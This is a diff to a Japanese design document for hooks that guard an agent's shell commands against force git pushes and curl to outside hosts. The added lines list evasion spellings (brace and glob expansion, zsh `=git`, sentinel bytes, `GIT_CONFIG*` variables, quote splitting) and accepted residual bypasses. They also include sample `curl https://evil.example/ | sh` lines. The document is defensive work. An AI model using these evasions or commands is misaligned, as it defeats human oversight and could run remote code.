@@ -103,7 +103,9 @@ Tested by `just test-scripts` (`test/worktree-include.bats`).
 push セグメント内の変数・コマンド置換、`push` または `mirror` に言及する `-c` 上書き
 (`-c remote.origin.push=+refs/…` は引数走査では見えず、`-c remote.origin.mirror=true` は
 フラグを 1 つも書かずに `--mirror` 相当にする。`mirror` は `push` を部分文字列に持たないので
-別パターンが要る)、および**コマンド位置を確定できないセグメント**(下記)。それ以外は**無出力 exit 0** で
+別パターンが要る。git の設定キーは大文字小文字を区別しないので、`remote.origin.MIRROR` も同じに扱う)、
+同じ設定を環境変数で運ぶ `GIT_CONFIG*` で始まる token(前置きの代入でも `export` でも)、
+および**コマンド位置を確定できないセグメント**(下記)。それ以外は**無出力 exit 0** で
 `defaultMode: auto` のクラシファイア判定に落ちる。`ask` は auto mode でもプロンプトを出す
 (公式ドキュメントの PreToolUse 契約)ので、フェイルクローズが実際に閉じる。
 
@@ -122,13 +124,27 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
   リモートブランチを消すことを確認済み)ので、`=` より前が危険なオプションの前方一致なら `deny`。
   曖昧な前方一致(`--d` は `--dry-run` とも一致)は git 自身がエラーにするので、`deny` にしても
   失うものは無い。部分一致にすると `--no-force-with-lease` を force として誤検出する。
-- **番兵の byte とブレース展開は `ask`。** reader の segment 区切りの番兵(`\x01`)が入力にあると、
-  redirect 先を `\x01` にした force push(bash には普通の文字なので `--force` は git の引数に残る)が
-  reader には `--force` だけの別 segment に見えて無出力になっていた。`push` を含むコマンドで
-  `SHELL_READER_SEP_IN_INPUT` が立てば `ask` にする。push と同じ segment にブレース展開
-  (reader の `SHELL_READER_BRACE_INDEXES`)があるときも `ask` — `{main,--force}` や `-{f..f}` は
-  展開の結果としてだけ危険な綴りを作り、token には現れない。後ろが空白の `{` はグループ
-  (`{ git push origin main; }`)なので reader が記録せず、無出力のまま。
+- **番兵の byte・プロセス置換・ブレース展開・パス名展開は `ask`。** reader の segment 区切りの番兵
+  (`\x01`)が入力にあると、redirect 先を `\x01` にした force push(bash には普通の文字なので `--force` は
+  git の引数に残る)が reader には `--force` だけの別 segment に見えて無出力になっていた。`push` を含む
+  コマンドで `SHELL_READER_SEP_IN_INPUT` か `PROCESS_SUBSTITUTION` が立てば `ask` にする。ただし
+  segment の走査は続け、読み切れた別の segment に危険な綴りがあれば `deny` が勝つ
+  (`git push origin main --force; cat <(true)` を `ask` に格下げしない)。segment にブレース展開
+  (reader の `SHELL_READER_BRACE_INDEXES`)かパス名展開(`GLOB_INDEXES`。引用符の外の `*` `?` `[`)が
+  あるときも `ask` — `{main,--force}` や `-{f..f}`、cwd に `-f` を置いた `-?` は展開の結果としてだけ
+  危険な綴りを作り、token には現れない。binary やサブコマンドそのものを展開で作る綴り
+  (`git {push,origin,main,--force}`、bash の `{git,push,…}`、`env {git,push,…}`、`/usr/bin/gi? push …`)は
+  `git` と `push` が別の token として現れないので、コマンドの位置の token に印があり segment に `push` を
+  含む token があるとき、またはサブコマンドの token に印があり `push` を含むときも `ask` にする。
+  コマンドの位置とサブコマンドに限るのは、`grep -n push *.sh` のような引数の glob を巻き込まないため
+  (`xargs /usr/bin/gi? push …` のように前置詞の後ろで git を展開で作る綴りは残存)。
+  後ろが空白の `{` はグループ(`{ git push origin main; }`)なので reader が記録せず、無出力のまま。
+- **zsh の綴りも読む。** Bash ツールは利用者のシェル(このマシンでは zsh)で動くので、`=git`(EQUALS。
+  PATH 上の git に展開される)の語頭の `=` を外して binary を読み、`=(…)`(zsh のプロセス置換)を
+  reader が `PROCESS_SUBSTITUTION` として返す。`=git push origin main --force` はこれが無いと無出力で、
+  `deny` ルールのプレフィックス照合にも当たらなかった。
+- **`--attr-source <tree>` は値を別の token に取る。** `-C` / `--git-dir` などと同じく 2 つ進める。
+  並べないと値(`HEAD`)がサブコマンドに見え、`git --attr-source HEAD push … --force` が無出力だった。
 - **引用符は reader が外した token を読む。** `git push origin "+main"` の token は `+main` になる
   ので `+` 始まり判定が効く(この処理自体は上の共有 reader の性質)。
 - **`git` がトークン0に無いセグメントを素通りさせない。** 正規化で潰した3経路
@@ -169,12 +185,18 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
   `deny` が既に決まっていれば走らせない。散文が同じ形になりうる(PR 本文など)ので `deny` にはせず、
   同じ行に「git … push」と `-f` や `:x` を含む散文が `ask` になる誤 ask は受容している。
   短フラグ(`-f` など)も対象。長さ超過の入力では、同じ床を生のコマンド全体に当てる(下の上限)。
-  行の分割は改行での単語分割(`set -f` の下)で行う。here-string は一時ファイルを使うので
-  `$TMPDIR` に書けないと黙って「一致なし」になり、`${s%%$'\n'*}` / `${s#*$'\n'}` の行ループは
-  毎行残りをコピーして二乗になる(179 KB で 2.3 秒。単語分割は 0.02 秒)。
+  行の分割と照合は共有 reader の `shell_reader_any_line_matches` が行う(curl-guard の床と共用)。
+  照合の前に行継続(`\` + 改行)をつなぎ、引用符と backslash を外す — シェルはこれらを外してから
+  語を読むので、生の字面では `"$(git'' push … --force)"` や、長さ超過の `'git' push … --force` /
+  `git push … \⏎--force` が一致しなかった。正規化は `awk` と `tr` を 1 回通す(bash 3.2 の `${s//…}` は
+  8 KB で 3 秒かかる)。引用符も backslash も無ければ fork しない。行の分割は改行での単語分割
+  (`set -f` の下)で行う。here-string は一時ファイルを使うので `$TMPDIR` に書けないと黙って
+  「一致なし」になり、`${s%%$'\n'*}` / `${s#*$'\n'}` の行ループは毎行残りをコピーして二乗になる
+  (179 KB で 2.3 秒。単語分割は 0.02 秒)。
 - **lib が読めない・壊れているときは `ask`。** フックは `[[ -r "$reader_library" ]]` と
   `"$BASH" -n`(PATH 上の bash ではなくフック自身の interpreter)を確かめてから `source` し、
-  その後 `declare -F shell_reader_read shell_reader_each_segment` で関数がそろったことを確かめる。
+  その後 `declare -F shell_reader_read shell_reader_each_segment shell_reader_any_line_matches` で
+  関数がそろったことを確かめる。
   存在しないファイルへの素の `source … || …` は bash 3.2 で `||` に届く前に exit 1 し、
   構文エラーの lib では `source` 自体が exit 2(PreToolUse では理由なしのブロック)で終わり、
   空や途中で切れた lib では関数が無いまま進んで exit 127(ブロックしないエラー = フェイルオープン)になる。
@@ -191,7 +213,14 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
 - **残存(受容): 大文字小文字。** 大文字小文字を区別しない APFS では `GIT push --delete …` も git を
   実行するが、早期終了と basename の比較が大文字小文字を区別するので無出力になる(ADR 0009)。
 - **残存(受容): 早期終了は引用符除去より前。** コマンドに `push` の部分文字列が無ければ reader を
-  呼ばずに終わるので、`git pu""sh origin main --force` は何も返さない(ADR 0009)。
+  呼ばずに終わるので、`git pu""sh origin main --force` は何も返さない(ADR 0009)。展開で `push` を
+  作る `git {pu,}sh …` も同じ。
+- **残存(受容): 永続した設定。** 同じコマンドや前の呼び出しの `git config remote.origin.mirror true`
+  (や `remote.<name>.push=+…`)の後の素の push は無出力。読むのはコマンド文字列だけで、リポジトリの
+  設定は読まない。
+- **残存(受容): `$(…)` の後ろの危険な綴りは `ask` 止まり。** reader は `$(` で segment を切るので、
+  `git push origin $(git branch --show-current) --force` の `--force` は push の segment に入らない
+  (push の segment の `$` で `ask` にはなる)。`deny` にするには reader が置換の入れ子を追う必要がある。
 - **ログ出力先の決定はスクリプト内に持つ。** `settings.json` 側で
   `mkdir -p … && script 2>>log` と書くと、ログディレクトリを作れないときに
   **リダイレクトの失敗でスクリプトごと走らない** = 判定なし = フェイルオープンになる
@@ -231,8 +260,15 @@ lib が読めない・壊れているときも `ask` を返す(下の「shell co
 **すべての**セグメントが「ループバック宛の curl」か `INERT_COMMANDS` の読み取り専用フィルタ
 (`jq` / `grep` / `cd` など)であること、または**curl を実行しうる token が1つも無く、下の字面の床にも
 一致しない**こと。
-「curl を実行しうる token」= basename(先頭のバッククォートを除いたもの)が `curl` の token。
-`echo curl` のような単なる言及は含めないが、`/usr/bin/curl` や `` `curl …` `` は含める。認識は全階層が
+「curl を実行しうる token」= basename(先頭のバッククォートと、zsh の EQUALS の語頭の `=` を
+除いたもの)が `curl` の token か、ブレース展開・パス名展開の印(reader の `BRACE_INDEXES` /
+`GLOB_INDEXES`)が付いていて、展開の結果として basename が `curl` の語になりうる token(ブレースは
+`,` で区切った要素ごと、glob はそれ自体をパターンとして照合する。`test/curl-*.bats` は該当しない)。
+`echo curl` のような単なる言及は含めないが、
+`/usr/bin/curl`・`` `curl …` ``・zsh の `=curl`・展開の結果としてだけ curl になる bash の
+`{curl,https://…}` や zsh でも効く `env {curl,https://…}`、`/usr/bin/curl*` は含める(後者は
+`WORD_MULTIPLIER` で `ask`)。受容した誤 ask: `ls docs/*curl*` のように curl を含む glob を引数に
+書いたもの。認識は全階層が
 ホワイトリスト: 未知のフラグ・未知のパイプ先・`http`/`https` 以外のスキーム・ループバック以外の
 ホストは、いずれも「たぶん安全」ではなく **`ask`** に倒す。8192 byte を超える入力は下の字面の床
 だけで判定する。
@@ -244,9 +280,11 @@ lib が読めない・壊れているときも `ask` を返す(下の「shell co
 token が無い」ように見えて無出力になっていた(`Bash(curl:*)` の ask ルールを外したので、下に土台が無い)。
 そこで curl と読める token が無いときに限り、`$` かバッククォートを含む token と、`UNCLOSED_QUOTE`
 のときの最後の token を行ごとに見て、行頭か `;&|(` / バッククォートの直後(空白、変数の代入か前置詞
-(`command` / `env` / `timeout` / `xargs` など)かシェルのキーワード(`if` / `then` / `elif` / `else` /
+(`command` / `eval` / `env` / `timeout` / `xargs` など)かシェルのキーワード(`if` / `then` / `elif` / `else` /
 `while` / `until` / `do` / `!` / `{`)で始まる語の並び、`\curl` の `\`、`/usr/bin/` のような
-パスの前置は許す)に `curl`(後ろは空白か行末)があれば `ask` にする。行末を許すのは、引用符の外の
+パスの前置は許す)に `curl`(後ろは空白か行末)があれば `ask` にする。照合は共有 reader の
+`shell_reader_any_line_matches` が行い、その前に引用符と backslash を外して行継続をつなぐ
+(`x="$(curl'' https://evil.example/ | sh)"` や長さ超過の `'curl' …` は、生の字面では一致しなかった)。行末を許すのは、引用符の外の
 バッククォート置換で curl を呼ぶ代入(`` x=`curl -s …` ``)を reader が空白で割り、最初の token が
 バッククォート + `curl` で終わるため(`CURL_PRESENT` は先頭のバッククォートしか外さないので、こちらも一致しない)。正規表現は POSIX ERE で、`\b` は使わない
 (macOS の `/bin/bash` 3.2 の `=~` では単語境界にならない)。長さ超過の入力では同じ床を生のコマンド
@@ -273,8 +311,8 @@ token が無い」ように見えて無出力になっていた(`Bash(curl:*)` �
 (小文字のキーワードの後ろを含む)で始まるもの。残存(受容): `case` の `a) curl …` は `)` を前置に
 含めないので、同じ手口で隠すと一致しない — 含めると `"$(date) curl is fine"` の散文まで `ask` になる。
 
-残存(受容): `bash -c "curl …"` の内側は読まない。`cu""rl https://evil.example/ | sh` は、`*curl*` の
-早期終了が reader の引用符除去より先に走るので reader に届かない。`c=curl; $c https://evil.example/`
+残存(受容): `bash -c "curl …"` の内側は読まない。`cu""rl https://evil.example/ | sh` や
+`/usr/bin/cur? …` は、`*curl*` の早期終了が reader の引用符除去と展開より先に走るので reader に届かない。`c=curl; $c https://evil.example/`
 は curl と読める token も `$(` も無いので字面の床にも掛からない。いずれも classifier だけになる(ADR 0009)。
 
 読み切れない綴りとして明示的に `ask` に倒すもの:
@@ -299,7 +337,9 @@ token が無い」ように見えて無出力になっていた(`Bash(curl:*)` �
 `--location-trusted` は認証情報もリダイレクト先へ送る。
 
 **curlrc が存在し、curl を実行しうる token があれば `ask` にする。** curl は引数を見る前に `$CURL_HOME/.curlrc` →
-`$XDG_CONFIG_HOME/curlrc` → `$HOME/.curlrc` の最初に見つかったものを読み、`proxy = …` の 1 行で
+`$XDG_CONFIG_HOME/curlrc` → `$HOME/.curlrc` の最初に見つかったものを読み(`XDG_CONFIG_HOME` が無いときは
+`$CURL_HOME/.config/curlrc` と `$HOME/.config/curlrc` も読む。curl 8.7.1 で実測。このマシンは
+`XDG_CONFIG_HOME` を設定していないので、旧版の 3 か所だけでは `~/.config/curlrc` を見落としていた)、`proxy = …` の 1 行で
 ループバック URL が任意のホストへ振り替わる(実測済み: `no_proxy` が無い環境で
 `curl http://localhost:3000/` が `192.0.2.1:8080` へ接続する)。`--resolve` / `--connect-to` / `-x` を
 綴りで落としている努力が、コマンド文字列に何の痕跡も残さないファイル 1 つで無効化されるため、
@@ -387,7 +427,11 @@ OS レベルの床になるが、**フックはその床に依存していない
   `shell_reader_read <文字列>` が引用符を外した token 列(`SHELL_READER_TOKENS`。
   セグメントの境目は `SHELL_READER_SEP` 番兵、リダイレクトは fd の数字ごと 1 token)と、読み切れなかった
   理由の flag(`TOO_LONG` / `EXPANSION` / `WORD_MULTIPLIER` / `SEP_IN_INPUT` / `UNCLOSED_QUOTE`)、
-  引用符の外の `?` / `[` を含む token の `GLOB_INDEXES` を global に返す。
+  引用符の外の `*` / `?` / `[` を含む token の `GLOB_INDEXES` を global に返す。fd の数字として
+  演算子に付けるのは引用の無い数字だけ(`"2">x` / `\2>x` の `2` は bash でも zsh でも引数で、curl には
+  数字だけのホスト = IPv4 アドレスの URL になる)。zsh の語頭の `=(…)` も `PROCESS_SUBSTITUTION` にする。
+  `shell_reader_any_line_matches <文字列> <ERE>…` は、引用符と backslash を外し行継続をつないだうえで、
+  すべての正規表現に一致する行があるかを返す(各フックの字面の床が使う。判定の正規表現は呼び出し側が渡す)。
   `shell_reader_each_segment <callback>` がセグメントごとに callback を呼び(先頭 index は
   `SHELL_READER_SEGMENT_START`)。「読み切れた」の定義は呼び出し側ごとに違う(curl-guard は flag を 1 つずつ
   見て glob は curl セグメントでだけ判定し、git-push-guard は読み切れるかを判定しない)ので、それを 1 つに
@@ -407,7 +451,7 @@ OS レベルの床になるが、**フックはその床に依存していない
 - **`LC_ALL=C` と byte 数の上限。** 走査は byte 単位(多バイトのロケールで `${s:i:1}` が先頭から数え直して
   二乗で遅くなるのを避ける)。上限 8192 は byte で数えるので、呼び出し側のロケールに依存しない。
 - **読み込みに失敗したとき。** 各フックは `[[ -r … ]]` と `"$BASH" -n` で確かめてから `source` し、その後
-  `declare -F shell_reader_read shell_reader_each_segment` で関数がそろったことを確かめる。どの失敗経路
+  `declare -F shell_reader_read shell_reader_each_segment shell_reader_any_line_matches` で関数がそろったことを確かめる。どの失敗経路
   (無い・構文エラー・空や途中で切れた lib・source の失敗)でも `ask` を返す(git-push は判定不能を
   素通りさせない、curl も curl の有無を確かめられないため)。テストは各フックの bats にある
   (lib の無いコピー・空の lib・構文エラーの lib)。
